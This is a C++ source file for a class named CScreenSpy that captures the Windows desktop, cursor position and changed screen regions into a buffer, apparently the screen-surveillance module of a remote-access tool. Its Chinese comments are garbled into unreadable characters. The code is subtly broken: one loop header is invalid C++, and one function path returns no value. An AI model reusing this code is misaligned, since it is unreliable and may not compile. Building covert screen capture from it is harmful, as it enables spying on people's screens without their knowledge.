// ScreenSpy.cpp: implementation of the ScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)
CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)   //*
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	
	if (!SelectInputWinStation())          //����û��ĵ�ǰ������
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}


	m_dwBitBltRop	= SRCCOPY;        //ֱ�Ӹ��ƹ����������죬��ѹ������ԭ��һģһ���Ĵ�С
	
	m_bAlgorithm	= ALGORITHM_DIFF; // Ĭ��ʹ�ò���ɨ���㷨
	m_dwLastCapture	= GetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;

    m_nIncSize		= 32 / m_biBitCount;

	m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);    //��Ļ�ķֱ���
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);


	m_nStartLine	= 0;
	
	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);      //Ϊ����ĻDC����һ���ڴ�DC
	m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
	m_hRectMemDC	= ::CreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;
	

	
	 //Ϊ����Ļ����һ��BitMapInfor
	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight); 
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);


	//���� Ӧ�ó������ֱ��д������豸�޹ص�λͼ�� DIB��
	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, 
		DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, 
		DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, 
		DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	
 
	//��λͼ���ָ���ڴ��豸�����Ļ�����
	::SelectObject(m_hFullMemDC, m_hFullBitmap);
	::SelectObject(m_hLineMemDC, m_hLineBitmap);
	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);
	

	//ʹ��������ȷ�����ε����򲢵õ�������ľ��
	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);
	
	//�����㹻���ڴ�
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;  //ÿ��
	
	m_rectBufferOffset = 0;



}


bool CScreenSpy::SelectInputWinStation()
{
	bool bRet = SwitchInputDesktop();   //��ǰ
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}





LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount Ϊ1 (�ڰ׶�ɫͼ) ��4 (16 ɫͼ) ��8 (256 ɫͼ) ʱ����ɫ������ָ����ɫ���С
biBitCount Ϊ16 (16 λɫͼ) ��24 (���ɫͼ, ��֧��) ��32 (32 λɫͼ) ʱû����ɫ��
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));   //BITMAPINFOHEADER +����ɫ��ĸ���
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = 
		((lpbmih->biWidth * lpbmih->biBitCount + 31)/32)*4* lpbmih->biHeight;
	
	// 16λ���Ժ��û����ɫ��ֱ�ӷ���
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95��Windows 98�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪλͼ���ܹ���ɨ��������
	
    Windows NT�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪ��0���������ִ��ʧ�ܣ���ô������0ֵ��Windows NT�������ø��������Ϣ�������callGetLastError������
	*/
  
	HDC	hDC = GetDC(NULL);  //ȡ��������Ļ���豸��������

	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // �߿���Ϊ0
	//������ָ�����豸������ص��豸���ݵ�λͼ
	
	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS); 
	//��ȡָ��λͼ����Ϣ����������ָ����ʽ���Ƶ�һ����������
	ReleaseDC(NULL, hDC);
	DeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, 
				lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = 
				lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;	
}



LPVOID CScreenSpy::getFirstScreen()
{
	//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, 
		m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;
	
	SelectInputWinStation();   
	
	// ����rect������ָ��
	m_rectBufferOffset = 0;
	
	// д��ʹ���������㷨
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));
	
	// д����λ��
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// д�뵱ǰ�������
	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));
	
	// ����Ƚ��㷨
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ  ���µ�λͼ���뵽m_hDiffMemDC��
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth,
			m_lpbmi_full->bmiHeader.biHeight);
	
		//FullMem   FullDc   m_hDiffMemDC
		
		//����Bit���бȽ������һ���޸�m_lpvFullBits�еķ���
		*lpdwBytes = m_rectBufferOffset + 
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits,
			m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);

		
	
		return m_rectBuffer;
	}
	

	//���������ʹ�������㷨
}


void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // ɨ����
	// ɨ����Ļ
	for (int i = 0, int	nToJump = 0; i < nHeight; i += nToJump)
	{
		int	nOther = nHeight - i;
		
		if (nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;   //49  50


		BitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
		Sleep(nJumpSleep);
	}
}

// ����Ƚ��㷨��ĺ���
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;
	
	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // ���ݼ�����
	// p1++ʵ�����ǵ�����һ��DWORD
	for (int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// һ�������ݿ鿪ʼ
		// д��ƫ�Ƶ�ַ
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// ��¼���ݴ�С�Ĵ��λ��
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // ���ݼ���������
		
		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
		
		nCount += 4;
		i += 4, p1++, p2++;
		
		for (int j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;
			
			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;	
	}
	
	// nOffsetOffset ����д����ܴ�С
	return nOffsetOffset;
}


void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
	memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}



CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
	::DeleteDC(m_hLineMemDC);
	::DeleteDC(m_hFullMemDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hDiffMemDC);
	
	::DeleteObject(m_hLineBitmap);
	::DeleteObject(m_hFullBitmap);
	::DeleteObject(m_hDiffBitmap);
	
	if (m_rectBuffer)
		delete[] m_rectBuffer;
	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
	delete[]	m_lpbmi_rect;
}



